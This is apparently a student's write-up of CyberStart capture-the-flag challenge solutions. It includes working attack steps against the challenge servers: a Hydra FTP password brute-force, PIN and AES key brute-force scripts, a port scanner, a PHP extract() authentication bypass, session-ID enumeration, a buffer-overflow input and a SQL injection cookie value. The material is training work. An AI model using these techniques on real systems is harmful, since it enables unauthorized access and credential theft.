### Headquarters Base- Cyberstart

Here's a basic overview of how I got the solutions to the tougher Cyberstart Challenges.

#### Level 7

C11 - Secret Spreadsheet
Revstr

``` python
import urllib.request, urllib.error, urllib.parse

link = "http://www.chiquitooenterprise.com/password"

response = urllib.request.urlopen(link)
response = response.read()
#print(response)

x = (response.decode('utf-8'))
#print(x)

revString = x[::-1]
#print(revString)

answer = "http://www.chiquitooenterprise.com/password?code=" + revString
response = urllib.request.urlopen(answer)
response = response.read()
print(response.decode('utf-8'))

```

#### Level 8

W0088 - Konami code- type console.log() in console for it to listen, and then press the following keys: up, up, down, down, left, right, left, right, b, a. Flag was then revealed.

Hidra- 
first, crack the password with hydra:
$ hydra -l secure_user -P words.txt ftp://services.cyberprotection.agency -s 2121
yielded pw: mutineers
connect to ftp server:
ftp services.cyberprotection.agency 2121
after entering username and password, used ls to list files and "get FLAG.txt" to download the file.

#### Level 9 

C06 - Mission Extension

connect to server via ssh, and find image files with the following:
$ find . -name '*' -exec file {} \; | grep -o -P '^.+: \w+ image'
Once I found the image, I had to exit the ssh connection to the server and establish an scp connection to download the file:

$ scp -P26041 9XtXpQhrht@54.229.163.112:./Contents/M5KDAN44 ~/

C09 
After connecting to the ssh server, $cd .. twice, then run the following command to find the file. 
$ find ./ -type f -ls | grep "Nov 22"
$ cat ./etc/protocol

C11
Uploading the images to aperisolve showed that one had a zip file in it. Extracted it with binwalk -e, which yielded an ELF named "msg". Running it gave the flag. 

C10: 
```python
import itertools
import os

numbers = '0123456789'
y = ''
for c in itertools.product(numbers, repeat = 4):
    pin = y+''.join(c)
    print(pin)
    os.system("./program-x86 " + pin)
```


#### Level 10
C02 - 
plug into python to calculate the number:

```python
print(4096+sum([i for i in range(1,5521)]))
```

C03 - download the two files, then run this command:
$ diff locks locks_old | grep '^<' | cut -c 3-

C04- this one took forever. Had to use the hint, which suggested using GIMP. With some more googling and after trying lots of tools, I used the "Threshold" tool and manipulating that revealed the flag along the edge of the image.

C05
enter the server, then:
$man -K matryoshka

apparently could have used apropos

C06
php code was given:
```
<?php
$key = '';
extract($_GET);
if ($key !== $password) {
?>
  <div class="main">
    <div class="logo"><img src="../assets/images/challenge-chirp-logo.svg" alt="Chirp logo"></div>

    <form class="form" method="GET">
      <div class="message message-error" id="msg-incorrect" style="display: none">Wrong. No chirping today.</div>

      <div class="field">
        <div class="label">Username</div>

        <input type="text" name="username" id="username">
      </div>

      <div class="field">
        <div class="label">Password</div>

        <input type="password" name="password" id="password">
      </div>

      <div class="actions">
        <input type="submit" value="Enter" class="btn">
      </div>
    </form>
  </div>
<?php
} else {
    require_once("emails");
};
?>
```
so I input parameters "key" and "password" into the url 

C10 - spent way too much time on this. LOTS of things kept breaking. sigh. final solution:

```python
# pip install pycryptodome
from Crypto.Cipher import AES
import base64
import os
import string
words = open("words.txt", "r", encoding = "utf-8")
wordlist = words.read()
wordlist = wordlist.split()
BLOCK_SIZE = 32

PADDING = b'{'

# Encrypted text to decrypt
encrypted = "uqX82PBZ8pi1fvt4GLHYgLs50ht8OQlrR1KHL2teppQ="

DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)


for secret in wordlist:
    if secret[-1:] == "\n":
        print("Error, new line character at the end of the string. This will not match!")
    elif len(secret.encode('utf-8')) >= 32:
        print("Error, string too long. Must be less than 32 bytes.")
    else:
        # create a cipher object using the secret
        cipher = AES.new(secret.encode('utf-8') + (BLOCK_SIZE - len(secret.encode('utf-8')) % BLOCK_SIZE) * PADDING, AES.MODE_ECB)

        # decode the encoded string
        decoded = DecodeAES(cipher, encrypted)
        if (decoded.startswith(b'FLAG:')):
            print ("Success: ")
            print(secret)
            print (decoded)
            break
        else:
            print("Wrong")
       
```

C11 - extracted first image using binwalk -e, pw for zipfile was Vidanya_Das

C12 - downloaded an ELF and a wordlist, but none of the wordlist passwords matched exactly- the challenge hinted at using John the Ripper and changing the passwords slightly. So after a little googling, I ran:

$ chmod +x program-x86
$ john -wordlist="words.txt" -rules --stdout > john.txt 
$ $ ./program-x86 john.txt 


#### Level 11

C02 - had to find an open port between 14000 and 15000:

```python
import socket
import threading
import time

# function to scan ports and see which ports are open
def scan_port(port):
	# we will check port of server
	server = "services.cyberprotection.agency"
	server_ip = socket.gethostbyname(server)
	
	# print("server_ip = {}".format(server_ip))
	status = False

	# create instance of socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# connecting the host ip address and port
	try:
		s.connect((server_ip, port))
		status = True
	except:
		status = False

	if status:
		print("port {} is open".format(port))


start_time = time.time()

for i in range(14000, 15000):
	thread = threading.Thread(target=scan_port, args=[i])
	thread.start()

end_time = time.time()
print("To all scan all ports it took {} seconds".format(end_time-start_time))
```

C03 - 
```python

message = [81, 95, 33, 108, 95, 26, 103, 95, 95, 110, 99, 104, 97, 26, 91, 110, 26, 110, 98, 95, 26, 60, 91, 92, 91, 108, 111, 109, 101, 99, 26, 104, 99, 97, 98, 110, 93, 102, 111, 92, 26, 99, 104, 26, 70, 105, 104, 94, 105, 104, 26, 91, 110, 26, 43, 43, 106, 103, 26, 110, 98, 99, 109, 26, 95, 112, 95, 104, 99, 104, 97, 40]

for num in range(1, 10):
  x = ''.join(chr(i+num) for i in message)
  print(x)
```
C04 - password check was a simple comparison to passwords in strings of file,
so running this:
strings strings3-x86 | xargs -n 1 ./strings3-x86 

gave the flag.

C05 - the images to download wouldn't load, so it was clear there was probably a magic numbers problem. Inserting the first 4 bytes with the jpg magic numbers into the largest image file did the trick - I could open the image and the flag was printed on it.

C06 - had to write a script to post a session id to a URL, the right one was 78:

```python
import requests

URL = 'https://bondogge.com/createPost?'

file = open("data.txt", "w")

for x in range(1, 100):
    post_data = {"userID":24,
                 "sessID":x}
    data = requests.post(URL, post_data).text
    file.write(data)
file.close()
```
I opened data.txt to read the data, there was the flag.

C07- I first tried converting de4dc0de to decimal, but that didn't work. Octal did it.

$ ./program-x86 $(printf "00000000000000000\336\300\115\336") 
Also had to play around with the number of zeros to cause the buffer overflow because changing the number of zeroes changed the output.

C12
Add a cookie with whatever name, and for cookie value insert:

WHERE name = 'Billy' OR 1=1

and then refresh the page.



